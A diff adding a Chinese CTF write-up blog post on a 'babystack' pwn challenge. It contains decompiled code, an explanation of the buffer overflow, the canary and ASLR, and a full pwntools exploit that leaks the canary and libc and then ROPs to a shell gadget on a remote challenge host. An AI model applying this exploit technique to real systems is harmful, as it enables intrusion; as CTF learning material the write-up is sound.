@@ -1,0 +1,153 @@
+---
+layout: post
+title:  pwn1
+date:   2020-09-28 00:01:01 +0300
+image:  2020-09-28-piano.jpg
+tags:   [ctf,pwn,厦门邀请赛]
+---
+
+查看文件信息
+
+![]({{site.baseurl}}/img/2020-09-28-check.jpg)
+
+ida查看main函数
+
+```assembly
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  int v3; // eax
+  char s; // [rsp+10h] [rbp-90h]
+  unsigned __int64 v6; // [rsp+98h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  memset(&s, 0, 0x80uLL);
+  while ( 1 )
+  {
+    sub_4008B9();
+    v3 = sub_400841();
+    switch ( v3 )
+    {
+      case 2:
+        puts(&s);
+        break;
+      case 3:
+        return 0LL;
+      case 1:
+        read(0, &s, 0x100uLL);
+        break;
+      default:
+        sub_400826("invalid choice");
+        break;
+    }
+    sub_400826((const char *)&unk_400AE7);
+  }
+}
+```
+
+memset为s变量分配空间。
+
+case1中的read有明显的溢出漏洞可以利用。
+
+查看sub_4008B9()函数
+
+```assembly
+__int64 sub_4008B9()
+{
+  sub_400826("--------");
+  sub_400826("1.store");
+  sub_400826("2.print");
+  sub_400826("3.quit");
+  sub_400826("--------");
+  return sub_4007F7(">> ");
+}
+```
+
+查看sub_400841()函数
+
+```assembly
+int sub_400841()
+{
+  char s; // [rsp+10h] [rbp-30h]
+  unsigned __int64 v2; // [rsp+38h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  memset(&s, 0, 0x20uLL);
+  if ( (signed int)read(0, &s, 0x20uLL) <= 0 )
+    exit(1);
+  return atoi(&s);
+}
+```
+
+read读入选择执行的序号。
+
+由于存在canary保护，需要先得到canary,
+
+由于开启了ASLR，所以需要构造ROP链。
+
+ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。但是，地址随机化不是对所有模块和内存区都进行随机化。虽然libc、栈、堆的加载位置被随机化，但主镜像不会。
+
+通过puts()函数输出泄露得到puts函数在程序运行时的地址，从而计算出libc的基地址，进而计算出"/bin/sh"的地址。
+
+在做题过程中遇到一个小问题，没有分清ljust()和rjust().
+
+This function rjust returns a new string of specified length with right-justified source string. We can specify the character to use for the padding, the default is whitespace. If the specified length is smaller than the source string, then the source string is returned.
+
+Python string ljust() is very similar to the rjust() function. The only difference is that the original string is left-justified. 
+
+If you want center-aligned string then you can use Python String center() function.
+
+-----------------------------------
+
+!!!在这里我还不明白为什么每次sendlind（payload）之后，都要执行case 3来return 0LL。
+
+------------------------------------------------
+
+exp
+
+```assembly
+from pwn import *
+
+io = remote("220.249.52.133",37853)
+
+elf = ELF("babystack")
+libc = ELF("libc-2.23.so")
+
+io.sendlineafter(">> ","1")
+payload = "A" * 0x88
+io.sendline(payload)
+io.sendlineafter(">> ","2")
+io.recvuntil("A"*88+"\n")
+canary = u64(io.recv(7).rjust(8,"\x00"))
+print("canary->",hex(canary))
+
+pop_rdi = 0x00400A93
+puts_got = elf.got["puts"]
+puts_plt = elf.plt["puts"]
+# print("puts_got->",hex(puts_got))
+# print("puts_plt->",hex(puts_plt))
+main_addr = 0x00400908
+payload1 = "A" * 0x88 + p64(canary) + p64(0x01314520) + p64(pop_rdi) + p64(puts_got)
+payload1 += p64(puts_plt) + p64(main_addr)
+#这里是调用puts_plt把puts_got的地址打印出来
+
+io.sendlineafter(">> ","1")
+io.sendline(payload1)
+io.recv()
+io.sendlineafter('>> ','3')
+puts_addr = u64(io.recv(8).ljust(8,"\x00"))
+print("puts_addr->",hex(puts_addr))
+base = puts_addr - libc.symbols["puts"]
+# print("base->",hex(base))
+bin_sh_addr = base + 0x45216
+
+payload2 = "A" * 0x88 + p64(canary) + p64(0x01314520) + p64(bin_sh_addr)
+io.sendlineafter(">> ","1")
+io.sendline(payload2)
+io.sendlineafter('>> ','3')
+
+io.interactive()
+```
+
